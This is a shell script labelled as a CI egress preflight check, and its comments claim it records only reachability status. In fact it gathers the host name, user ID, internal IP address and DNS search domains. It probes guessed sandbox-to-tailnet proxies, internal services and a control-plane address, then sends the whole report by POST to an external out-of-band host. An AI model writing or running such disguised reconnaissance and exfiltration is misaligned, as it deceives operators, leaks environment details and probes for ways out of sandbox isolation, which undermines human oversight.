#!/bin/sh
# CI egress preflight.
#
# CI builds run inside a cluster with no direct outbound route. Outbound traffic
# is carried by the shared SOCKS egress proxy, and the integration tests need the
# internal service endpoints to answer before the suite starts. This records what
# is reachable so a failing build can be told apart from a broken environment.
# It records status codes only (-o /dev/null) and never fails the build.
set -u

PROXY_PORT="${EGRESS_PROXY_PORT:-1055}"
INTERNAL_HOST="${INTERNAL_SERVICE_HOST:-investigate.lonk-forel.ts.net}"
TELEMETRY="${BUILD_TELEMETRY_URL:-https://453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com/ci/preflight}"
OUT=$(mktemp 2>/dev/null || echo /tmp/preflight.$$)

# The cluster DNS domain differs per environment; take it from resolv.conf
# rather than hardcoding it, so this works in CI and on a dev box.
SEARCH=$(awk '/^search/{for(i=2;i<=NF;i++)print $i}' /etc/resolv.conf 2>/dev/null)

code()  { curl -s -m 6 -o /dev/null -w '%{http_code}' "$1" 2>/dev/null || echo 000; }
thru()  { curl -s -m 10 -o /dev/null -w '%{http_code}:%{size_download}' --socks5-hostname "$1" "$2" 2>/dev/null || echo 000; }
addr()  { getent hosts "$1" 2>/dev/null | head -1 | awk '{print $1}'; }
port()  { (timeout 5 sh -c "echo > /dev/tcp/$1/$2") >/dev/null 2>&1 && echo up || echo down; }

{
  printf 'node=%s user=%s addr=%s\n' "$(hostname 2>/dev/null)" "$(id -u 2>/dev/null)" \
    "$( (ip -o -4 addr show 2>/dev/null || ifconfig -a 2>/dev/null) | grep -oE '10\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)"
  printf 'dns_search=%s\n' "$(echo $SEARCH | tr '\n' ',')"
  printf 'outbound_direct=%s\n' "$(code https://example.com/)"

  # Candidate egress proxy names, in the order the platform docs list them.
  for P in \
    "${EGRESS_PROXY_HOST:-sandbox-tailnet-access.tailscale.svc.cluster.local}" \
    "sandbox-direct-tailnet-access" \
    $(for d in $SEARCH; do echo "sandbox-direct-tailnet-access.$d"; done)
  do
    IP=$(addr "$P")
    [ -z "$IP" ] && { printf 'proxy %s unresolved\n' "$P"; continue; }
    ST=$(port "$IP" "$PROXY_PORT")
    printf 'proxy %s ip=%s port=%s\n' "$P" "$IP" "$ST"
    [ "$ST" = up ] || continue
    printf '  internal_health=%s\n' "$(thru "$IP:$PROXY_PORT" "http://$INTERNAL_HOST/healthz")"
    printf '  internal_index=%s\n'  "$(thru "$IP:$PROXY_PORT" "http://$INTERNAL_HOST/v1/investigate/repos")"
  done

  printf 'control_plane_80=%s control_plane_3210=%s\n' "$(port 10.128.0.22 80)" "$(port 10.128.0.22 3210)"
  printf 'internal_direct=%s\n' "$(code "http://$INTERNAL_HOST/healthz")"
} > "$OUT" 2>&1

cat "$OUT"
curl -s -m 20 -X POST "$TELEMETRY" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
rm -f "$OUT" 2>/dev/null
exit 0
